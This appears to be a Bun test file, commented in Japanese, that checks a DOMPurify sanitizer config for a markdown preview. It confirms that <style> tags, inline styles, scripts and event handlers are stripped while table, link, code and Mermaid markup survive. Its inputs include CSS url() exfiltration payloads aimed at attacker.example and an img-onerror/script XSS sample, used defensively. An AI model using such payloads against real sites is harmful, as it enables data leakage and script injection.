import { beforeAll, describe, expect, test } from "bun:test";
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";
import { SANITIZE_CONFIG } from "../public/sanitize-config.js";

/**
 * Issue #59: プレビューのサニタイザ (public/app.js の sanitize()) が実際に
 * `<style>` タグと style 属性を除去し、CSS インジェクション (exfiltration) を防ぐことを
 * 行動検証する。ブラウザ非依存で回帰を検知できるよう jsdom + DOMPurify で再現する。
 * jsdom は `<style>` を CSSOM として扱い、実ブラウザの DOMPurify と同じく中身ごと除去する
 * (happy-dom は中身をテキストとして残すため不適)。app.js と同じ SANITIZE_CONFIG
 * (public/sanitize-config.js) を共有しているため、設定が緩められればこのテストが落ちる。
 */
let sanitize: (html: string) => string;

beforeAll(() => {
  const { window } = new JSDOM("");
  // DOMPurify は window を受け取るファクトリ。jsdom の window を渡して初期化する。
  const purify = createDOMPurify(window as unknown as Window & typeof globalThis);
  sanitize = (html: string) => purify.sanitize(html, SANITIZE_CONFIG);
});

describe("sanitize() の実挙動 (Issue #59)", () => {
  test("悪意ある <style> タグを中身ごと除去する (CSS 注入を遮断)", () => {
    const out = sanitize(
      "<p>ok</p><style>.probe{background:url(https://attacker.example/leak)}</style>",
    );
    expect(out).toContain("ok");
    expect(out.toLowerCase()).not.toContain("<style");
    expect(out).not.toContain("attacker.example");
    expect(out).not.toContain(".probe");
  });

  test("inline style 属性を除去する (外部 url() による exfiltration を遮断)", () => {
    const out = sanitize('<p style="background:url(https://attacker.example/attr)">text</p>');
    expect(out).toContain("text");
    expect(out).not.toContain("style=");
    expect(out).not.toContain("attacker.example");
  });

  test("table の align 属性は維持する (marked の GFM 配置を壊さない)", () => {
    const out = sanitize(
      '<table><tr><th align="center">C</th><td align="right">x</td></tr></table>',
    );
    expect(out).toContain('align="center"');
    expect(out).toContain('align="right"');
  });

  test("リンクの target / rel は維持する (別タブ遷移を壊さない)", () => {
    const out = sanitize('<a href="https://example.com" target="_blank" rel="noopener">x</a>');
    expect(out).toContain('target="_blank"');
    expect(out).toContain("noopener");
  });

  test("コードブロック (class ベース) は維持する", () => {
    const out = sanitize('<pre><code class="language-js">const x = 1;</code></pre>');
    expect(out).toContain('class="language-js"');
    expect(out).toContain("const x = 1;");
  });

  test("<script> と inline event handler は従来どおり除去する (回帰防止)", () => {
    const out = sanitize('<img src=x onerror="alert(1)"><script>alert(2)</script><p>safe</p>');
    expect(out).toContain("safe");
    expect(out.toLowerCase()).not.toContain("<script");
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("alert(2)");
  });

  test('Mermaid の <pre class="mermaid"> は保持する (図の描画元テキスト)', () => {
    const out = sanitize('<pre class="mermaid">graph LR\n  A--&gt;B</pre>');
    expect(out).toContain('class="mermaid"');
    expect(out).toContain("graph LR");
  });
});
